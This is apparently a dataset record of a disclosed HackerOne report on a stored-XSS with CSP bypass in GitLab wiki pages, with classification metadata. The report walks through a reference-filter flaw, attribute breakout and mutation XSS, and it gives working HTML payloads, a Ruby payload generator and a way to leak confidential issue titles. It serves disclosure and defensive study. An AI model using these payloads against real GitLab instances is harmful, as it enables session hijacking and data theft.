{
  "reported_to": "GitLab",
  "reported_by": "yvvdwf ",
  "title": "Stored-XSS injected in Wiki page via Banzai pipeline",
  "content": "\nHello,\nI found a vulnerability in AbstractReferenceFilter class that can be exploited to inject any HTML elements leading to stored-XSS.\nReproduce\nCreate a new project.\nGot to its Wikis, Create your first page button, then fill the form:\nTitle: _sidear\nContent: please see in _sidebar.md attached file (_sidebar.md (F2868304))\nTitle: _sidear\nContent: please see in _sidebar.md attached file (_sidebar.md (F2868304))\n<image_0>\nclick Create page to save the wiki page\nafter the page is reloaded, you should see an alert which is caused by alert(document.domain)\nNote: you will not see the alert if you are the person who can access to the Gitlab confidential issue https://gitlab.com/gitlab-org/gitlab/-/issues/428268 which is used to track one of my H1 report. (thus, you login using another account, can create a private issue, then replace the link above by your issue's link)\nImpact\nStored-XSS with CSP-bypass allows executing arbitrary javascript at the client side on behalf of victims including any RESTfull API.\nTL;DR\n## 1. gsub\nThe vulnerable code is as the following:\nCode 1.49 KiB\n1# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L116\n2        def call\n3          ...\n4          link_pattern_start = /\\A#{link_pattern}/\n5          ...\n6          nodes.each_with_index do |node, index|\n7            ...\n8            elsif element_node?(node)\n9              yield_valid_link(node) do |link, inner_html|\n10                ...\n11                if link == inner_html && inner_html =~ link_pattern_start\n12                  replace_link_node_with_text(node, index) do\n13                    object_link_filter(inner_html, link_pattern, link_reference: true)\n14                  end\n15\n16\n17# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L182\n18       def object_link_filter(text, pattern, link_content: nil, link_reference: false)\n19          references_in(text, pattern) do |match, id, project_ref, namespace_ref, matches|\n20            ...\n21            if object\n22              ... \n23              link = ...\n24\n25# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L38\n26    def references_in(text, pattern = object_class.reference_pattern)\n27          text.gsub(pattern) do |match|\n28            if ident = identifier($~)\n29              yield match, ident, $~[:project], $~[:namespace], $~\n30            else\n31              match\n32            end\n33          end\n34        end\nI'm not sure for which reason link_pattern_start is used to check only the prefix of link_pattern (not the whole) in the first function of the listing above. And latter the link_pattern is used in gsub to replace any occurrences in the third function. Consider the following HTML snippet:\nCode 98 Bytes\n1<a href=\"LINK_PATTERN<a alt='&quot;LINK_PATTERN'></a>\">LINK_PATTERN<a alt='\"LINK_PATTERN'></a></a>\nThe second replacement of LINK_PATTERN will expanse the corresponding information into alt attribute. This information will never be redacted as it tag <a> does not have class = gfm. This can be used to disclose titles of private GitLab-specific references\nFor example, open an issue with the following content (we need <i> tag to have nested <a> tags):\ninput:\nCode 281 Bytes\n1<dl><a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i>\">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i></a></dl>\noutput: we can get the title of Gitlab's confidential issue 428268:\n<image_1>\n## 2. &quot;\nNow if we replace single quot by double one, and add href attribute as the following:\nCode 320 Bytes\n1<dl><a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href=&quot;//xxx&quot; alt=&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot;></a></i>\">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href=\"//xxx\" alt=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268\"></a></i></a></dl>\nWe get the result:\n<image_2>\nBecause the second replacement of LINK_PATTERN broke down the double quotes of alt to introduce other attributes. The result was latter redacted by:\nCode 534 Bytes\n1# https://gitlab.com/gitlab-org/gitlab/blob/e03b60053f7f7d35c05b2732f59524a6bc6a5456/lib/banzai/reference_redactor.rb#L66\n2  def redacted_node_content(node)\n3      original_content = node.attr('data-original')\n4      original_content = CGI.escape_html(original_content) if original_content\n5\n6      original_link =\n7        if node.attr('data-link-reference') == 'true'\n8          href = node.attr('href')\n9\n10          %(<a href=\"#{href}\">#{original_content}</a>)\n11        end\n12\n13      original_link || original_content || node.inner_html\n14    end\nThis means that if we can inject &quot; in to the href attribute, then we can break it.\nFortunately, the Sanitize is here and it replaces \" by %22 in the href attribute.\nCode 320 Bytes\n1# https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40\n2\n3  # Mapping of original characters to escape sequences for characters that\n4  # should be escaped in attributes affected by unsafe libxml2 behavior.\n5  UNSAFE_LIBXML_ESCAPE_CHARS = {\n6    ' ' => '%20',\n7    '\"' => '%22'\n8  }\nAny users' direct input of href is sanitized but not the href which are generated by other HTML filters. One of them is GollumTagsFilter.\nIf we provide the following input:\nCode 17 Bytes\n1[[a|http:'\"&lt;]]\nthen we get:\nCode 95 Bytes\n1<a rel=\"nofollow noreferrer noopener\" class=\"gfm\" href=\"http:'&quot;&lt;\" target=\"_blank\">a</a>\nSo fare, we can introduce any attribute into <a> tag, or add arbitrary tag. The latter will have no attribute because no space between tag name and attribute (any space character is URI encoded when serializing href).\nFor example:\ninput:\nCode 506 Bytes\n1<dl><a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268*&lt;i&gt;&lt;a href=&quot;http:&#39;&amp;quot;yvvdwf=here&amp;gt;&amp;lt;img/src=&amp;quot;0&amp;quot;onerror=&amp;quot;alert(0)&amp;quot;&amp;gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot; class=&quot;gfm&quot;&gt;a&lt;/a&gt;&lt;/i&gt;\">https://gitlab.com/gitlab-org/gitlab/-/issues/428268*<i>[[a|http:'\"yvvdwf=here&gt;&lt;img/src=\"0\"onerror=\"alert(0)\"&gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268]]</i></a></dl> \noutput:\nCode 269 Bytes\n1<dl>&#x000A;<a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268\">https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>*<i><a href=\"http:'\" yvvdwf=\"here\"><img></a><a>https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>\" class=\"gfm\"&gt;a</i>&#x000A;</dl>\n## 3. mXSS\nThe backend parses HTML by using Nokogiri with HTML4 format. HTML4 accepts only space characters between tag name and the attribute. Howeverthe browser supports HTML5 which tolerate some additional characters, such as /.\nFor example, this snippet <img/src=\"0\"onerror=\"alert(0)\"> will give different result:\n<image_3>\n<img src=\"0\" onerror=\"alert(0)\"> at the browser\nAs we can inject any tag, we use <style> to keep inside the snippet which will be sent to browser as-is:\nCode 46 Bytes\n1<style><img/src=\"0\"onerror=\"alert(0)\"></style>\nFinally, to be able to get the <img> tag back, we put all of them inside <svg> tag:\nCode 57 Bytes\n1<svg><style><img/src=\"0\"onerror=\"alert(0)\"></style></svg>\nAt the browser, the<img> tag is mutated to get outside of <svg> context. Thus we get the following result:\nCode 59 Bytes\n1<svg><style></style></svg>\n2<img src=\"0\" onerror=\"alert(0)\">\nUntil here, we can inject any tag with any attribute. By using the basic payload <i class=gl-show-field-errors><input title=\"<script>alert(document.domain)</script>\"/></i> we can get XSS.\npayload\nThis is a small Ruby snippet to generate the payload:\nCode 692 Bytes\n1def gen_payload( payload, based_url: \"https://gitlab.com/gitlab-org/gitlab/-/issues/428268\")\n2  payload    = \"#{payload}#{based_url}\" unless payload.include? based_url\n3  payload    = payload.gsub('<', '&lt;').gsub('>', '&gt;')\n4\n5  es_payload = %(*<i><a href=\"http:#{ payload.gsub('\"','&quot;') }\" class=\"gfm\">a</a></i>)\n6  es_payload = CGI.escape_html( es_payload ).gsub('%20', '%2520') #double encode space/tab/new_line\n7\n8  a = %(<dl><a href=\"#{ based_url }#{ es_payload }\">#{ based_url }*<i>[[a|http:#{ payload }]]</i></a></dl>)\n9  puts a\n10end\n11\n12gen_payload %('\"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title=\"<script>alert(document.domain)</script>\"/></style></svg>)\nBest regards,\nyvvdwf\nImpact\nStored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.\n\n",
  "severity": [
    8.7,
    null
  ],
  "bounty": 1000,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uo5mmbrtb0tpkxwd97b4dwqig77f?response-content-disposition=attachment%3B%20filename%3D%220.sidebar.png%22%3B%20filename%2A%3DUTF-8%27%270.sidebar.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWDNVDTOV%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T214736Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFfYz76VgKIVelpAyZYrTFyd%2Bv888ECgb3hj5JkFANhaAiBakh4q7w5DF%2BQv%2FfR5eWubo4B2u%2Bo1QPF29kQLxJJCtSq7BQj0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMaTuljdCxi50w8QUmKo8FD%2BiOVbeXUa7mNlCRPUySpi4kddXYtD2seD5WI2%2F2DmARIyxhjceaM8TKf%2BSYoZzhII3Lo%2BxB9bhtM5mq5GHf8dhuKa6wT1fnf6QzZEKaUgSCbLM07nMLMlW8kqutXY0X59awJLzZ1yQMPBhBi80DLAkNvswgcBRW4v5P7iqkX0ggbzpmcRST%2FVm29J8Y5JKSc3LejY6AEIsv4KP6HB8aQXd%2BfsBH5R%2Bv6nok8pt6DJSaPkv5WA74F1I2%2FsmQsyL3exdqZLhvUP%2B6eTtLSHhdrEDhOIY34aESXhoik3RW%2B8g32NTyeA3P2G9e%2F4F7a3Rx6v%2BE7XMojKylsb5WIGfTy8QvhnCQCH9ukOo6rO5xOtdoQw%2BU4WqZuOTJU74EkFLV6%2FyUVWSq4FVDYEYqrbwizaX9y%2FV2Cy9LgrEtMK6sn8DZ3ViZlKyuxY19GNuJ5sW0c0M4RHngn3EmFJO0aNsL0r%2BbolwLdLRfuYtJe5DmZwCoKEbDaNAUonhneBWF55jLQZHoGAoWZ6qMF%2BevUTo0Jql5kULJryvcc%2FFpS8lTO%2BOZ3fGiS1eQAI2Fz0703T3mmda4haYMEOXNijTbkWhBg5v9JYyT2oqNlXBK7WUSUCkENcoqMjC4Z4VbEGjG4jS2qi%2BTYrhX4S3Sb1T987q8w6MeoXfX6tGmDYwiyj5QpWbUDz7cYSR0EBMdQlqeDG94vE59xzsfUrmstdXm%2FFxukqgG%2B7WWbJ1DxPiM3ia6sOr977IrFajGqovgtqRLgyGpz%2F9TqWE3RwWypLQ084%2FW16SLKEEufJUuPDTkr6LyX%2FDeWbUHVMs85EWTJG9ustt2iOq1%2F11LdHrP2SbFR46XOj69Mtw5xz%2F6iYaqUFV4ejD8yoa%2FBjqyAYwDDYybi7D4pT0wCry5lOVh3Zq%2B8g6G5jdIa7jf8%2FaU312%2BiIcARtKrUoF2Sn0ak6xLhjw%2BJVOcFyXg%2FOHRvGjaHhYmekMQ96U1XkJfdyuitawsi7z%2FEymOHQV%2BY9%2Bfo8XothwNtx6eE%2FG6W1iLa%2BedAtMC1tXYp3IvbXoZrn4jPRRJ5G0BroF0e3VIz4sm1tGxNoieH9VOPyqjIvF8mLhji1Uw2M%2F8ryzZmpR%2Fx4z3q1Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=500a3c1863229209305a48eb56ca55e5cb1d03921755f730e9f24e7fef32b672",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qbb8g0bqy82v5ax1wz76b6bcfmf7?response-content-disposition=attachment%3B%20filename%3D%221.disclosure.png%22%3B%20filename%2A%3DUTF-8%27%271.disclosure.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWDNVDTOV%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T214736Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFfYz76VgKIVelpAyZYrTFyd%2Bv888ECgb3hj5JkFANhaAiBakh4q7w5DF%2BQv%2FfR5eWubo4B2u%2Bo1QPF29kQLxJJCtSq7BQj0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMaTuljdCxi50w8QUmKo8FD%2BiOVbeXUa7mNlCRPUySpi4kddXYtD2seD5WI2%2F2DmARIyxhjceaM8TKf%2BSYoZzhII3Lo%2BxB9bhtM5mq5GHf8dhuKa6wT1fnf6QzZEKaUgSCbLM07nMLMlW8kqutXY0X59awJLzZ1yQMPBhBi80DLAkNvswgcBRW4v5P7iqkX0ggbzpmcRST%2FVm29J8Y5JKSc3LejY6AEIsv4KP6HB8aQXd%2BfsBH5R%2Bv6nok8pt6DJSaPkv5WA74F1I2%2FsmQsyL3exdqZLhvUP%2B6eTtLSHhdrEDhOIY34aESXhoik3RW%2B8g32NTyeA3P2G9e%2F4F7a3Rx6v%2BE7XMojKylsb5WIGfTy8QvhnCQCH9ukOo6rO5xOtdoQw%2BU4WqZuOTJU74EkFLV6%2FyUVWSq4FVDYEYqrbwizaX9y%2FV2Cy9LgrEtMK6sn8DZ3ViZlKyuxY19GNuJ5sW0c0M4RHngn3EmFJO0aNsL0r%2BbolwLdLRfuYtJe5DmZwCoKEbDaNAUonhneBWF55jLQZHoGAoWZ6qMF%2BevUTo0Jql5kULJryvcc%2FFpS8lTO%2BOZ3fGiS1eQAI2Fz0703T3mmda4haYMEOXNijTbkWhBg5v9JYyT2oqNlXBK7WUSUCkENcoqMjC4Z4VbEGjG4jS2qi%2BTYrhX4S3Sb1T987q8w6MeoXfX6tGmDYwiyj5QpWbUDz7cYSR0EBMdQlqeDG94vE59xzsfUrmstdXm%2FFxukqgG%2B7WWbJ1DxPiM3ia6sOr977IrFajGqovgtqRLgyGpz%2F9TqWE3RwWypLQ084%2FW16SLKEEufJUuPDTkr6LyX%2FDeWbUHVMs85EWTJG9ustt2iOq1%2F11LdHrP2SbFR46XOj69Mtw5xz%2F6iYaqUFV4ejD8yoa%2FBjqyAYwDDYybi7D4pT0wCry5lOVh3Zq%2B8g6G5jdIa7jf8%2FaU312%2BiIcARtKrUoF2Sn0ak6xLhjw%2BJVOcFyXg%2FOHRvGjaHhYmekMQ96U1XkJfdyuitawsi7z%2FEymOHQV%2BY9%2Bfo8XothwNtx6eE%2FG6W1iLa%2BedAtMC1tXYp3IvbXoZrn4jPRRJ5G0BroF0e3VIz4sm1tGxNoieH9VOPyqjIvF8mLhji1Uw2M%2F8ryzZmpR%2Fx4z3q1Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ac0015dbc64313c306e2218f25f0bc01963784377faff4fc4f1608f4cf0d8cd",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ki50917ixmntk0q99ptmq7ax5p69?response-content-disposition=attachment%3B%20filename%3D%222.breakdown.png%22%3B%20filename%2A%3DUTF-8%27%272.breakdown.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWDNVDTOV%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T214736Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFfYz76VgKIVelpAyZYrTFyd%2Bv888ECgb3hj5JkFANhaAiBakh4q7w5DF%2BQv%2FfR5eWubo4B2u%2Bo1QPF29kQLxJJCtSq7BQj0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMaTuljdCxi50w8QUmKo8FD%2BiOVbeXUa7mNlCRPUySpi4kddXYtD2seD5WI2%2F2DmARIyxhjceaM8TKf%2BSYoZzhII3Lo%2BxB9bhtM5mq5GHf8dhuKa6wT1fnf6QzZEKaUgSCbLM07nMLMlW8kqutXY0X59awJLzZ1yQMPBhBi80DLAkNvswgcBRW4v5P7iqkX0ggbzpmcRST%2FVm29J8Y5JKSc3LejY6AEIsv4KP6HB8aQXd%2BfsBH5R%2Bv6nok8pt6DJSaPkv5WA74F1I2%2FsmQsyL3exdqZLhvUP%2B6eTtLSHhdrEDhOIY34aESXhoik3RW%2B8g32NTyeA3P2G9e%2F4F7a3Rx6v%2BE7XMojKylsb5WIGfTy8QvhnCQCH9ukOo6rO5xOtdoQw%2BU4WqZuOTJU74EkFLV6%2FyUVWSq4FVDYEYqrbwizaX9y%2FV2Cy9LgrEtMK6sn8DZ3ViZlKyuxY19GNuJ5sW0c0M4RHngn3EmFJO0aNsL0r%2BbolwLdLRfuYtJe5DmZwCoKEbDaNAUonhneBWF55jLQZHoGAoWZ6qMF%2BevUTo0Jql5kULJryvcc%2FFpS8lTO%2BOZ3fGiS1eQAI2Fz0703T3mmda4haYMEOXNijTbkWhBg5v9JYyT2oqNlXBK7WUSUCkENcoqMjC4Z4VbEGjG4jS2qi%2BTYrhX4S3Sb1T987q8w6MeoXfX6tGmDYwiyj5QpWbUDz7cYSR0EBMdQlqeDG94vE59xzsfUrmstdXm%2FFxukqgG%2B7WWbJ1DxPiM3ia6sOr977IrFajGqovgtqRLgyGpz%2F9TqWE3RwWypLQ084%2FW16SLKEEufJUuPDTkr6LyX%2FDeWbUHVMs85EWTJG9ustt2iOq1%2F11LdHrP2SbFR46XOj69Mtw5xz%2F6iYaqUFV4ejD8yoa%2FBjqyAYwDDYybi7D4pT0wCry5lOVh3Zq%2B8g6G5jdIa7jf8%2FaU312%2BiIcARtKrUoF2Sn0ak6xLhjw%2BJVOcFyXg%2FOHRvGjaHhYmekMQ96U1XkJfdyuitawsi7z%2FEymOHQV%2BY9%2Bfo8XothwNtx6eE%2FG6W1iLa%2BedAtMC1tXYp3IvbXoZrn4jPRRJ5G0BroF0e3VIz4sm1tGxNoieH9VOPyqjIvF8mLhji1Uw2M%2F8ryzZmpR%2Fx4z3q1Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6776ab5c956e7b0f0c4bcc3d34061a7c435800dd4c6cc6902f8f66687a78a713",
    "image_3": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/s383uny9u8cdrimw6ddnm0wu98vp?response-content-disposition=attachment%3B%20filename%3D%22nokogiri-html4.png%22%3B%20filename%2A%3DUTF-8%27%27nokogiri-html4.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWDNVDTOV%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T214736Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFfYz76VgKIVelpAyZYrTFyd%2Bv888ECgb3hj5JkFANhaAiBakh4q7w5DF%2BQv%2FfR5eWubo4B2u%2Bo1QPF29kQLxJJCtSq7BQj0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMaTuljdCxi50w8QUmKo8FD%2BiOVbeXUa7mNlCRPUySpi4kddXYtD2seD5WI2%2F2DmARIyxhjceaM8TKf%2BSYoZzhII3Lo%2BxB9bhtM5mq5GHf8dhuKa6wT1fnf6QzZEKaUgSCbLM07nMLMlW8kqutXY0X59awJLzZ1yQMPBhBi80DLAkNvswgcBRW4v5P7iqkX0ggbzpmcRST%2FVm29J8Y5JKSc3LejY6AEIsv4KP6HB8aQXd%2BfsBH5R%2Bv6nok8pt6DJSaPkv5WA74F1I2%2FsmQsyL3exdqZLhvUP%2B6eTtLSHhdrEDhOIY34aESXhoik3RW%2B8g32NTyeA3P2G9e%2F4F7a3Rx6v%2BE7XMojKylsb5WIGfTy8QvhnCQCH9ukOo6rO5xOtdoQw%2BU4WqZuOTJU74EkFLV6%2FyUVWSq4FVDYEYqrbwizaX9y%2FV2Cy9LgrEtMK6sn8DZ3ViZlKyuxY19GNuJ5sW0c0M4RHngn3EmFJO0aNsL0r%2BbolwLdLRfuYtJe5DmZwCoKEbDaNAUonhneBWF55jLQZHoGAoWZ6qMF%2BevUTo0Jql5kULJryvcc%2FFpS8lTO%2BOZ3fGiS1eQAI2Fz0703T3mmda4haYMEOXNijTbkWhBg5v9JYyT2oqNlXBK7WUSUCkENcoqMjC4Z4VbEGjG4jS2qi%2BTYrhX4S3Sb1T987q8w6MeoXfX6tGmDYwiyj5QpWbUDz7cYSR0EBMdQlqeDG94vE59xzsfUrmstdXm%2FFxukqgG%2B7WWbJ1DxPiM3ia6sOr977IrFajGqovgtqRLgyGpz%2F9TqWE3RwWypLQ084%2FW16SLKEEufJUuPDTkr6LyX%2FDeWbUHVMs85EWTJG9ustt2iOq1%2F11LdHrP2SbFR46XOj69Mtw5xz%2F6iYaqUFV4ejD8yoa%2FBjqyAYwDDYybi7D4pT0wCry5lOVh3Zq%2B8g6G5jdIa7jf8%2FaU312%2BiIcARtKrUoF2Sn0ak6xLhjw%2BJVOcFyXg%2FOHRvGjaHhYmekMQ96U1XkJfdyuitawsi7z%2FEymOHQV%2BY9%2Bfo8XothwNtx6eE%2FG6W1iLa%2BedAtMC1tXYp3IvbXoZrn4jPRRJ5G0BroF0e3VIz4sm1tGxNoieH9VOPyqjIvF8mLhji1Uw2M%2F8ryzZmpR%2Fx4z3q1Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fb422828e1b5bc3188782a917d7fbb205ad9b51a62ee155f1c4410e3fcfac81b"
  },
  "disclosed_date": 1716898260,
  "report_url": "https://hackerone.com/reports/2257080",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a new project and navigate to its Wikis section. Click 'Create your first page' button."
    ],
    [
      2,
      "Fill the form with Title: '_sidear' and Content: 'please see in _sidebar.md attached file (_sidebar.md (F2868304))'. Click 'Create page' to save the wiki page."
    ],
    [
      3,
      "After the page reloads, an alert will be displayed due to the injected JavaScript (alert(document.domain))."
    ]
  ],
  "vuln_description": "The vulnerability is a Stored-XSS with CSP-bypass in the AbstractReferenceFilter class, allowing attackers to inject arbitrary HTML elements and execute JavaScript in the context of the victim's session. This is achieved through a combination of HTML parsing inconsistencies, attribute manipulation, and mXSS (Mutation XSS) techniques.",
  "reason": "This vulnerability involves multiple complex components: understanding the Banzai pipeline's HTML processing, exploiting gsub pattern matching quirks, manipulating HTML attribute encoding, leveraging mXSS through HTML4/HTML5 parsing differences, and bypassing CSP protections. The attack requires deep knowledge of GitLab's internal reference processing and careful construction of nested HTML elements with specific attribute manipulations.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves stored-XSS via HTML injection in Wiki pages, which is a client-side issue rather than an authentication/authorization boundary crossing. The proposed methodologies focus on testing access control between different user sessions and resources, not HTML injection or XSS vulnerabilities.",
    "is_detectable": false
  }
}